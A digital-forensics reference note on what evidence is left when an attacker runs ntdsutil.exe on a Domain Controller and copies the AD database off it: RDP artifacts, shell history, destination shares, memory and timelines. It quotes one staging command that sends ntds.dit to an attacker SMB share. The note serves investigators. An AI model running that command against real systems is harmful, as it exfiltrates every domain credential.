# LOLBins — ntdsutil.exe — Source Evidence

**A structural note before the artifact tables:** every other tool built so far in this module (Impacket, Sliver, Mimikatz) has a genuine "source" host — a separate box the operator's tooling runs *from*, distinct from the target it acts against. `ntdsutil.exe` breaks that pattern. It has no network client of its own (`01 - Overview.md`), so it always executes **on the Domain Controller itself** — the "target" *is* the host it runs on. What counts as "source evidence" for this tool therefore depends entirely on **how the operator got onto the DC in the first place**, and in most of the realistic scenarios from `02`, that access-vector's own tooling already owns the source-evidence story in this repo. This file covers what's genuinely specific to `ntdsutil`'s own use, and points to where the rest lives rather than re-deriving it.

## Contents
- [Interactive Session on the DC Itself](#interactive-session-on-the-dc-itself)
- [Reached via a Chained Remote-Execution Tool](#reached-via-a-chained-remote-execution-tool)
- [Evidence at the Exfiltration Destination](#evidence-at-the-exfiltration-destination)
- [Command History and Live Process State — On the DC](#command-history-and-live-process-state--on-the-dc)
- [Memory Forensics](#memory-forensics)
- [Timeline Correlation Value](#timeline-correlation-value)

---

## Interactive Session on the DC Itself

If the operator reached the DC via RDP or a console logon and typed the `ntdsutil` command directly, there is **no separate source host** to examine — the "source" evidence for that access is the DC's own Terminal Services/RDP session artifacts (Security 4624 Logon Type 10, `TerminalServices-RemoteConnectionManager` event log, `TerminalServices-LocalSessionManager` 21/22/23/24/25), which are DC-side (target-side) evidence in this note's own terms, covered in `04 - Target Evidence.md` rather than here. If the operator RDP'd *from* their own attack box, that box's own RDP client-side cache (`%LocalAppData%\Microsoft\Terminal Server Client\Cache\`, `HKCU\Software\Microsoft\Terminal Server Client\Servers`) is the closest thing to genuine source evidence this scenario produces — general RDP client-side forensics for that artifact class already live in `Windows/12 - Lateral Movement.md`, not re-derived here.

## Reached via a Chained Remote-Execution Tool

The overwhelming majority of the realistic source-evidence story for this tool lives in whatever access vector actually got the operator onto the DC — each of these is already a fully-built sibling note in this repo:

| Access vector used (per `02`'s scenarios) | Where its source evidence is already covered |
|---|---|
| Impacket `wmiexec.py` | `Impacket/wmiexec/03 - Source Evidence.md` — shell history, dual-connection network fingerprint, `lput`/`lget` artifacts, `.pyc` bytecode-cache mtimes |
| Impacket `psexec.py` | `Impacket/psexec/03 - Source Evidence.md` |
| PowerShell Remoting (WinRM) | `PSReadLine` history (`(Get-PSReadLineOption).HistorySavePath`), live `WSMan`/`Invoke-Command` session state on the operator's own box — general WinRM/PSRemoting source-side forensics not yet built as a standalone note in this module; treat the shell history and PowerShell transcript/Script Block Logging (Event ID 4104) on the **operator's own host**, if enabled there, as the primary leads |
| A prior C2 implant already resident on the DC | `Sliver/03 - Source Evidence.md` or `PowerShell Empire/03 - Source Evidence.md`, depending on the framework — the C2 operator console's own logging is the "source," not any host-level artifact on the DC |

## Evidence at the Exfiltration Destination

The one genuinely tool-specific "source-side" artifact this note contributes: when the operator uses the staging use case from `02` (`create full \\10.10.10.50\loot$\ifm` or a similar remote/removable/cloud-sync destination), the **receiving** location becomes operator-controlled evidence in its own right —

| Destination | What lands there |
|---|---|
| Attacker-controlled SMB share | The full `Active Directory\ntds.dit` + `registry\SYSTEM`/`SAM` folder structure, with file-creation timestamps matching the moment of exfiltration — often the single highest-value artifact recoverable if that share's host is later seized |
| Removable media | Same file structure, plus whatever device/volume-serial-number forensics apply to removable storage generally (`Windows/06 - Evidence of Program Execution` USB-device-history coverage, not re-derived here) |
| A cloud-sync folder (OneDrive, Dropbox, etc.) already present on the DC | The sync client's own local database/journal (e.g. OneDrive's `~/AppData/Local/Microsoft/OneDrive/logs/`) can independently corroborate that the staged files were actually uploaded, and when — a strong timeline anchor if the DC itself is later wiped or the local copy is deleted |

## Command History and Live Process State — On the DC

Since `ntdsutil` runs locally, the closest analog to "source" command-line exposure is on the DC's own console/PowerShell history — genuinely target-side by this note's definition, but included here because it's the direct equivalent of the shell-history artifacts every other sub-tool in this module documents under Source Evidence:

```powershell
# PSReadLine history on the DC, if the operator used an interactive PowerShell session
Get-Content (Get-PSReadLineOption).HistorySavePath | Select-String 'ntdsutil'

# cmd.exe has no persistent history file by default — DosKey buffer is session-only,
# lost the moment the console/session closes
```

`ntdsutil.exe` itself writes **no session log or history file of its own** — there is no "ntdsutil history" artifact class the way there might be for a tool with its own logging subsystem.

## Memory Forensics

If the DC itself is later imaged live (rare in practice given the availability impact, but possible in an active-incident scenario), a still-resident `ntdsutil.exe` process's memory can hold the exact command-line arguments passed to it — useful if command-line auditing (Security 4688) wasn't enabled at the time and the process is still running when the box is captured. Once `ntdsutil.exe` has exited, this recovery path is gone; the durable evidence at that point is entirely the target-side artifacts in `04`.

## Timeline Correlation Value

Because this tool collapses "source" and "target" onto the same host in the common case, the highest-value timeline anchor isn't a source-vs-target correlation the way it is for `wmiexec.py` or `psexec.py` — it's **access-vector-to-execution** correlation: matching whichever remote-access technique's own timestamp (an RDP 4624 Type 10, a `wmiexec.py`-shaped DCOM authentication, a WinRM `Invoke-Command` session) against the `ntdsutil.exe` process-creation event on the DC (`04 - Target Evidence.md`) within a tight window is what proves *how* the operator reached the DC in the first place — a question this tool's own artifacts alone cannot answer.
